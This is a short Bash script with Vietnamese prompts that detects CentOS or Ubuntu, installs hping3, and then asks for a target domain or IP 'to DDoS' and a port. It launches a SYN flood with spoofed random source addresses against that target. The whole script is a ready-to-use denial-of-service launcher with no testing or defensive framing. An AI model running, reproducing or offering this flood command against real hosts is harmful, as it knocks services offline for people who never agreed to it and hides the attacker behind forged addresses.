#!/bin/bash
clear
PS3="Vui lòng chọn chức năng :"
if (`cat /etc/os-release | grep -q 'CentOS'`); then
        echo Hệ điều hành của bạn là : CentOS
        cat /etc/os-release | head -5
        echo "................................"
        opt1=("Setup" "Run" "Exit")
                select menu1 in "${opt1[@]}"
                do
                        case $menu1 in
                "Setup")
                        echo " Đang cài đặt Hping3.. "
                        sudo yum install hping3 -y
                ;;
                "Run")
                        printf "Tên miền hoặc IP cần DDos : "
                read n
                        printf "Port :"
                read m
                        hping3 -c 10000 -d 128 -S -w 64 -p $m --flood --rand-source $n
                ;;
                "Exit")
                        break
                ;;
                esac
                done
elif (`cat /etc/os-release | grep -q 'Ubuntu'`); then
         echo Hệ điều hành của bạn là : Ubuntu
         cat /etc/os-release | head -2
         echo "..............................."
         opt2=("Setup" "Run" "Exit")
                select menu2 in "${opt2[@]}"
                do
                        case $menu2 in
                "Setup")
                        echo "Đang cài đặt Hping3.. "
                        sudo apt-get install hping3 -y
                ;;
                "Run")
                        printf "Điền tên miền hoặc IP cần DDos : "
                read n
                        printf "Port : "
                read m
                        hping3 -c 10000 -d 128 -S -w 64 -p $m --flood --rand-source $n
                ;;
                "Exit")
                        break
                ;;
                esac
                done
else
        echo Không xác định được hệ điều hành $REPLY
fi
